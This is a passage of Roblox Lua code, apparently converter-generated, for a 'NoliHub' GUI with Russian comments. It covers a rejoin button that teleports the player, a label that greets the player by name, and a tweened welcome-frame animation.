-- StarterGui.NoliHub.Rejoin.LocalScript
local function C_a()
local script = G2L["a"];
	local Players = game:GetService("Players")
	local TeleportService = game:GetService("TeleportService")
	local PlaceId = 168556275
	
	local button = script.Parent
	
	local function Click()
		TeleportService:Teleport(PlaceId, Players.LocalPlayer)
	end
	
	button.MouseButton1Click:Connect(Click)
end;
task.spawn(C_a);
-- StarterGui.NoliHub.MainFrame.Welcome.Name.InsertName
local function C_19()
local script = G2L["19"];
	local Players = game:GetService("Players")
	
	-- Функция для вставки имени игрока в TextLabel
	local function insertPlayerName(textLabel)
		-- Получаем игрока, которому принадлежит LocalScript
		local player = Players.LocalPlayer
	
		if player then
			-- Устанавливаем текст TextLabel с именем игрока
			textLabel.Text = "Добро пожаловать, " .. player.Name
		else
			warn("Player not found!")
		end
	end
	
	-- Пример использования
	local textLabel = script.Parent -- Укажите имя вашего TextLabel
	insertPlayerName(textLabel)
	
end;
task.spawn(C_19);
-- StarterGui.NoliHub.MainFrame.Welcome.Move
local function C_1a()
local script = G2L["1a"];
	local TweenService = game:GetService("TweenService")
	
	local guiElement = script.Parent -- GUI элемент, который нужно переместить
	local boolValue = script.Parent.MoveThis -- Предполагаем, что BoolValue находится в том же родителе
	
	-- Функция для плавного перемещения GUI элемента
	local function moveGuiElement(units, direction, time, onComplete)
		-- Задаем целевую позицию в зависимости от направления и количества единиц
		local targetPosition
		if direction == "up" then
			targetPosition = guiElement.Position + UDim2.new(0, 0, -units / 100, 0)
		elseif direction == "down" then
			targetPosition = guiElement.Position + UDim2.new(0, 0, units / 100, 0)
		elseif direction == "left" then
			targetPosition = guiElement.Position + UDim2.new(-units / 100, 0, 0, 0)
		elseif direction == "right" then
			targetPosition = guiElement.Position + UDim2.new(units / 100, 0, 0, 0)
		else
			warn("Invalid direction specified. Use 'up', 'down', 'left', or 'right'.")
			return
		end
	
		local tweenInfo = TweenInfo.new(
			time, -- Время анимации
			Enum.EasingStyle.Back, -- Стиль плавности
			Enum.EasingDirection.InOut, -- Направление анимации
			0, -- Повторение (0 = без повторения)
			false, -- Обратная анимация
			5 -- Задержка перед началом
		)
	
		local tween = TweenService:Create(guiElement, tweenInfo, {Position = targetPosition})
	
		-- Добавляем действие, которое выполняется после завершения анимации
		tween.Completed:Connect(function()
			if onComplete then
				onComplete()
				script.Parent.Visible = false
				script.Parent.Parent.Protects.SimpleProtect.Visible = false
			end
		end)
	
		tween:Play()
	end
	
	-- Функция для запуска анимации
	local function startAnimation()
		script.Parent.Parent.Protects.SimpleProtect.Visible = true
		script.Parent.Visible = true
		moveGuiElement(230, "up", 5, function()
			print("Анимация завершена, действие выполнено.")
		end)
	end
	
	-- Отслеживаем изменения значения BoolValue
	boolValue.Changed:Connect(function()
		if boolValue.Value then
			startAnimation()
		end
	end)
	
	-- Если BoolValue уже true, запускаем анимацию сразу
	if boolValue.Value then
		startAnimation()
	end
	
end;
task.spawn(C_1a);
